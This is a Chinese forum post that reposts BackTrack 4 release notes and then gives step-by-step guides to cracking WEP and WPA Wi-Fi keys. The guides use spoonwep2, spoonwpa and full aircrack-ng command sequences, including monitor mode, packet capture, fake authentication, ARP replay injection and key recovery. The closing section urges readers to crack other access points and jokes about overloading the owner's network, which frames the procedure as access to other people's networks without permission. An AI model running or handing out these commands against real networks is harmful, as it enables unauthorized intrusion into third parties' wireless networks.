@@ -1,0 +1,208 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+BT4详解
+D8888D主贴内容-------------------------------------------------------
+Ak-killer
+
+BT4全称Back Track four，这是一个linux环境的便携系统，可以放到U盘或者光盘中启动，对本身硬盘没有影响，无需在本地安装
+　　是圈内非常著名的黑客攻击平台，是一个封装好的Linux操作系统，内置大量的网络安全检测工具以及黑客破解软件等。
+BT3~4因可以方便的破解无线网络而出名，其中内置的spoonwep是一个非常强悍的图形化破解WEP无线网络密码的工具。
+
+
+简介
+Backtrack 是处于世界领先地位的渗透测试和信息安全审计发行版本。有着上百种预先安装好的工具软件，并确定能够
+完美运行，Backtrack4 提供了一个强大的渗透测试平台--从Web hack的应用程序到RFID 审查，都可由Backtrack来完成。
+
+内幕 
+BackTrack 的基础
+BT4 引入了许多显著的变化，基于Ubuntu Intrepid。现在开始使用我们自己修改了的Ubuntu软件包和渗透测试工具软件来 
+维护我们自己全部的软件仓库。
+另外一个显著的变化是更新linux 核心版本到2.6.29.4.这个新核心带来了一整套系统内在的变化，使得极大地改变了BackTrack
+的架构。
+
+Backtrack 的核心
+不再使用lzma格式的squashfs作为live cd的文件系统，从而导致了一个更大容量的ISO文件。但从另外一个方面来看，这也使得我们
+不用维护我们自己的核心补丁问题。目前这是很痛苦的，因为squashfs融入主流核心的速度十分缓慢。
+BT4使用了squashfs-tools version 4.0,内建的squashfs核心模块（2.6.29.4），和旧版本不兼容。使用了AUFS格式作为
+统一文件系统 （unification filesystem）。
+核心已经安装了几个无线驱动的注入和优化补丁，并且打了bootsplash 补丁，这些补丁都能在核心源码包中找到。（/usr/src/linux/patches）
+这些变化意味着以前很多在BT2/BT3中使用的方法已经不再有效，比如启动时的cheatcodes参数。
+由于核心的转移也意味着不再使用live-linux脚本来生成iso文件，现在我们使用casper.
+
+软件包和软件仓库
+BT4中一个最大的变化就是使用了软件仓库，可以经常更新安全补丁和工具，类似Debian。意味着如果你选择把BT4安装到硬盘，
+你就可以通过apt-get命令，维护和更新你的软件包。
+BT4工具软件有以下几个大类：
+BackTrack-Enumeration
+BackTrack-Tunneling
+BackTrack-Bruteforce
+BackTrack-Spoofing
+BackTrack-Passwords
+BackTrack-Wireless
+BackTrack-Discovery
+BackTrack-Cisco
+BackTrack-Web Applicaitons
+BackTrack-Forensics
+BackTrack-Fuzzers
+BackTrack-Bluetooth
+BackTrack-Misc
+BackTrack-Sniffers
+BackTrack-VOIP
+BackTrack-Debuggers
+BackTrack-Penetration
+BackTrack-Database
+BackTrack-RFID
+BackTrack-Python
+BackTrack-Drivers
+BackTrack-GPU
+
+Meta packages
+工具软件的分类有一个很好的特点，就是我们可以支持“BackTrack meta packages”. 一个Meta 软件包是一个虚设的软件包，
+可以包含其他的几个软件包。比如，meta软件包“backtrack-web” 可以包括BT4提供的所有Web渗透测试工具应用软件。
+Meta Meta 软件包
+有两个meta meta packages: backtrack-world 和backtrack-desktop
+backtrack-world 包含了所有的BackTrack meta软件包
+backtrack-desktop包含了backtrack-world,backtrack-networking 和backtrack-mulimedia.后面的两个meta软件包从Ubuntu
+引入的。
+
+Up and running with BackTrack
+我们制作了名为“Up and running with BackTrack”的短片，展示了一般和不一般的特点。
+下面是个很好的地方，可以了解BT4中的新变化：
+[url=http://www.offensive-security.co]链接标记http://www.offensive-security.co[/url] ... ning-backtrack.html
+
+安装BT4到硬盘
+BT4(基础框架版和全版本)包含了一个修改了的Ubiquity installer.这种安装是非常简单易懂的。请看这里的视频教程：
+[url=http://www.offensive-security.co]链接标记http://www.offensive-security.co[/url] ... rack-hard-disk.html
+
+更新BT4
+使用apt-get命令来更新BT4是比较简单的
+apt-get update 同步更新软件包列表
+apt-get upgrade 下载和安装所有可用的更新
+apt-get dist-upgrade 下载和安装所有的升级更新
+
+定制BT4
+
+制作你自己的Live CD
+
+方法1
+
+制作你自己喜欢的BT4是很简单的.
+1.下载并安装BT4的基础核心架构版本
+2.用apt-get安装需要的软件包
+3.用remmastersys重新打包你的安装
+
+方法2
+下载BT4的iso文件，使用定制脚本来更新和修改，参看下面地址：
+[url=http://www.offensive-security.co]链接标记http://www.offensive-security.co[/url] ... ve-cd-the-easy-way/
+
+安装BT4到U盘
+
+最简单安装BT4到U盘的方法就是用unetbootin 工具软件。（在BT4 的/opt/目录下）
+
+安装BT4到U盘 -保存数据
+
+视频教程看这里：
+[url=http://www.offensive-security.co]链接标记http://www.offensive-security.co[/url] ... ck-usb-install.html
+
+运行BT4
+
+KDE3 特别用法
+BT4 包含了“强加的”KDE3,和KDE4 Ubuntu Intrepid库同存。BT4使用KDE3,牢记KDE3包都有“kde3”的后缀，可以和KDE4区分。
+比如,你想安装KDE中的kate文本编辑器，你必须apt-get install kate-kde3(安装KDE3版本中的kate),
+而不是apt-get kate(安装KDE4版本中的kate).
+
+人工更新工具
+BT4软件仓库会极力保持更新最新版本的工具软件，但有极少的部分例外。这些“特殊的”软件由他们的作者经常更新，有些还包括
+显著的更新。我们感到对这些类型的工具制作静态的二进制文件是无益的，这些软件的使用者最好使用SVN来同步更新。这些工具包括
+MSF,W2AF,Nikto等。
+
+FAQS
+-Ubiquity Installer给出了个错误“Language failed with exit code 10”,为什么？
+-无视它。相信我。
+
+-为什么BT4的iso文件那么大？以前版本只有一半大小？
+-以前很长一段时间我们尽力把BT保持在700MB。但这太具有挑战性，也是苦不堪言。我们决定打破这个限制，基于下面原因：
+1.我们不再使用LZMA压缩的squashfs，这使得映像文件的尺寸大大增加。
+2.CD光盘不再是在live环境中运行BT4的理想媒介，U盘更快也更可靠。
+
+-为什么这个版本称为“pre-release”?还不够稳定吗？
+-这是最强健的BackTrack版本。说到这儿，有些bugs很难明确找到。当运行atheros网卡40小时后我们才注意到无线帧的崩溃，
+原因在于一个有缺陷的补丁。不可能去测试每个驱动和每个硬件的运行情况。这就是我们需要你的加入的原因（在论坛上）。
+
+-为什么要基于Ubuntu？
+-请看blog的帖子
+[url=http://backtrack4.blogspot.com/2]链接标记http://backtrack4.blogspot.com/2[/url] ... bout-backtrack.html
+
+-我已经安装BT4到硬盘，如何登录？
+-使用在安装过程建立的用户名/密码登录，登录后，sudo su,更新root的密码。参看这个视频：
+[url=http://www.offensive-security.co]链接标记http://www.offensive-security.co[/url] ... ning-backtrack.html
+
+结束语
+你可以在这里找到我们的论坛：[url=http://forums.remote-exploit.org]链接标记http://forums.remote-exploit.org[/url]
+请尽管发帖报告bug，建议，要求的工具软件等等。
+希望你能喜欢这个优秀的发行版本！
+
+Remote Exploit Team
+
+集成spoonwep2与spoonwpa光盘版BT4及破.解方法
+
+我用bt4-beta光盘版破.解方法与命令,那里不对请各位高手给予指点及修改。我的显卡NVIDIA GeForce 9300M GS，我的网卡是Intel (R) WiFi Link 5100 AGN，先将网卡的驱动软件升级到12.2.0.11这版本(其他版本我个人试过多不行)，下载了bt4-beta，下载了spoonwep2(下载后解压)，下载了SWPA(下载后解压),用雨林木风的UltraISO 8.66软件编辑spoonwep.lzm及SWPA.lzm这2个文件到bt4-beta下的modules目录中，然后用nero7.5.9.0软件将保存好的镜像刻录成DVD光盘，一张完美的光盘版bt4-beta做好啦。
+　　光盘启动，用户名：root回车、密码：toor(一般多不会显示)回车、startx回车后就进入图形界面(显卡支持的话)。
+　　
+3条命令破.解法:
+先开一个窗口输入第一条：aireplay-ng -9 wlan0回车(等待数据跳动停止)
+输入第二条：airodump-ng --ivs -w sjb -c 6 wlan0回车
+另开一个窗口输入第三条：aircrack-ng -n 64 -b 00:11:22:33:44:55 sjb-01.ivs回车(00:11:22:33:44:55改成实际要破.解密码的网卡，如sata数据包涨的够快，大约到15000个左右密码自动就出来啦，目前只能被动破.解密码，还没有注入成功过，如sata数据包涨的很慢，就只能开着电脑慢慢等待)
+　　
+spoonwep2破.解法：
+先开一个窗口输入ln -fs bash /bin/sh回车，再输入ls -al /bin/sh回车(这个命令可以显示是否设置成功，显示bash为成功,dash为失败),如是成功的话就输入spoonwep2回车后就会弹出spoonwep2的窗口啦。点击SPOONWEP SETTINGS,在NET CARD里选WLAN0，在DRIVER里选NORMAL,在MODE里选UNKNOWN VICTIM,再点击NEXT、点击LAUNCH进入搜索，然后关闭spoonwep2再开一下，点击SPOONWEP SETTINGS,在NET CARD里选MON0，在DRIVER里选NORMAL,在MODE里选UNKNOWN VICTIM,再点击NEXT、点击LAUNCH进入搜索后就可以看见好多网卡啦，选定1个网卡点击SelectION OK,选定PO841 REPLAY ATTACK(这里有4条命令选择)，点击LAUNCH后就等待密码的出来(sata数据包到30000个左右)。注：论坛中的高手说spoonwep2支持5100AGN网卡注入式破.解，我个人认为还是被动破.解或注入不是很成功吧?
+
+spoonwpa破.解法：
+先开一个窗口输入ln -fs bash /bin/sh回车，再输入ls -al /bin/sh回车(这个命令可以显示是否设置成功，显示bash为成功,dash为失败),如是成功的话就输入spoonwpa回车后就会弹出spoonwpa的窗口啦。在NET CARD里选WLAN0，在DRIVER里选NORMAL,在MODE里选UNKNOWN VICTIM,再点击NEXT、点击LAUNCH进入搜索，然后关闭spoonwpa再开一下，点击SPOONWEP SETTINGS,在NET CARD里选MON0，在DRIVER里选NORMAL,在MODE里选UNKNOWN VICTIM,再点击NEXT、点击LAUNCH进入搜索后就可以看见好多网卡啦，选定1个必须有客户端的网卡点击SelectION OK, 再点击LAUNCH AUTOMATED HANDSHAKE CAPTURE，如抓到握手包，请点击金色锁开始破.解，这完全的靠字典啦。
+
+感觉SWPA.lzm里面自带的字典太简单啦，字典全用完后连我自己设定的10位数字密码也破.解不了，我把路由器的密码重新设定成SWPA.lzm字典库里的密码，不出10分钟密码就出来啦，这说明spoonwpa破.解WPA密码是可行的，就是所破的密码字典库里必须也有才能破.解。
+我用字典生成器生成字典，想把新生成的字典加载到SWPA.lzm里面，然后再刻录成DVD光盘来使用，就不知怎么把字典加到SWPA.lzm里面，或在BT4下用什么命令来加载硬盘里的字典，论坛里的各位高手帮帮忙，我十万分的感谢！谢绝其他办法
+
+
+一些命令
+用户名 root
+密码 toor
+进图形 startx
+
+BT4有自带的工具networkmanager,不过缺省没有启用
+命令 /etc/init.d/NetworkManager start (注意字母大小写) 
+右下角的球体变绿了，鼠标点击就可以出现有线和无线网络配置菜单，设置好即可上网
+Vmware下BT4安装vmware-tools
+2009-09-06 11:15加载 vm-tools的iso
+mkdir /mnt/cdrom
+CD-ROM路径：c:\programfiles\VMware\VMware Workstation\linux.iso
+mount /dev/cdrom3 /mnt/cdrom
+复制安装包到/tmp目录
+cp -rf /mnt/cdrom/VMwareTools-7.8.5-156735.tar.gz /tmp/
+解压：
+tar zxpf VMwareTools-7.8.5-156735.tar.gz
+然后需要下载一个补丁：
+wget [url=http://www.offensive-security.com/tools]链接标记www.offensive-security.com/tools[/url] ... k4-7.8.5-2_6_29.tar
+tar -xvf vmaware-tools-patch-backtrack4-7.8.5-2_6_29.tar
+下完解压后直接运行：
+./vmwaretools.sh
+执行完后，会提示进入vmware-tools目录执行安装程序：
+cd vmware-tools-distrib
+./vmware-install.pl
+
+
+另外，本篇介绍下在ubuntu下使用aircrack -ng 破解WEP密码 此方法为终端输入式破解 文字破解 注入破解 拥有高效的成果。
+1、在终端中输入 sudo airmon-ng start wlan0 启动无线网卡的监控模式（wlan0是无线网卡的端口,可在终端中输入 ifconfig 查看）
+启动无线网卡的监控模式
+2.在终端中输入 sudo airodump-ng mon0 （特别说明：启动监控模式后无线网的端口现在是 mon0 ！！！） 看看有哪些采用wep加密的AP在线，然后按 ctrl+c 退出，保留终端
+3.查看在线的AP
+另开一个终端，输入 sudo airodump-ng -c 6 --bssid AP's MAC -w wep mon0 (-c后面跟着的6是要破解的AP工作频道，--bissid后面跟着的AP's MAC是要欲破解AP的MAC地址，-w后面跟着wep的是抓下来的数据包DATA保存的文件名，具体情况根据步骤2里面的在线AP更改频道和MAC地址，DATA保存的文件名可随便命名）抓包
+4、再另开一个终端，输入 sudo aireplay-ng -1 0 -a AP's MAC -h My MAC mon0 与AP建立虚拟连接 （-h后面跟着的My MAC是自己的无线网卡的MAC地址)
+使无线网卡与AP建立虚拟连接
+5.成功建立虚拟连接后
+建立虚拟连接成功后，输入 sudo aireplay-ng -2 -F -p 0841 -c ff:ff:ff:ff:ff:ff -b AP's MAC -h My MAC mon0 进行注入，现在回头看下步骤3的终端是不是DATA在开始飞涨
+正在进行注入
+6、收集有5000个以上的DATA之后，另开一个终端，输入 sudo aircrack-ng wep*.cap 进行解密 （如果没算出来的话，继续等，aircrack-ng 会在DATA每增加多5000个之后就自动再运行，直到算出密码为至）
+破解密码成功
+破解出密码后在终端中输入 sudo airomon-ng stop mon0 关闭监控模式，不然无线网卡会一直向刚刚的AP进行注入的，用ctrl+c退出或者直接关闭终端都是不行的。 现在可以冲浪去了，或者重复步聚1-7破解其它的AP 呵呵兄弟们冲浪时可别太猛了，不然把主人给冲翻了可就不好。
